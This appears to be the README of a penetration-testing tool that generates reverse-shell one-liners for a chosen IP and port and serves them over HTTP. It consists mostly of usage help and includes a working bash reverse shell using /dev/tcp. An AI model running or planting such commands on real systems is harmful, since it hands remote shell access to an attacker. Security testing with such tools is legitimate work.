# Reverse shell vending machine

This is a VERY simple script that can be used to create your basic reverse-shell commands.

All of this commands can be found online, and several people like [PentestMonkey](https://github.com/pentestmonkey) have made collections of them already. This is another collection, that can be used to insert the local IP and PORT easily.



usage: sheller.py [-h] [-i LOCALADDR] [-p LOCALPORT] [-o OUTFILE]
                  [--httpserver] [--httpport HTTPPORT] [-e INTERFACE]
                  shellLanguage

A script to generate reverse shells on various languages.

positional arguments:

  *shellLanguage*        Language to identify the shell to be built. Use -s to
                       see available shells.

optional arguments:

  -h, --help           show this help message and exit

  -i LOCALADDR         Address to connect back to

  -p LOCALPORT         Port to connect back to

  -o OUTFILE           File to write the reverse shell to

  --httpserver         Server the reverse-shell file on a http server

  --httpport HTTPPORT  Port to start HTTP server in, default 80

  -e INTERFACE         Interface name to get ip for reverse shell script
  
  example:

  sudo python3 sheller.py bash -p 8080 --httpserver -i eth4

  produces:

  bash -i >& /dev/tcp/169.254.138.91/8080 0>&1

  and serves it on http-server at all interfaces on port 80 at / http://localhost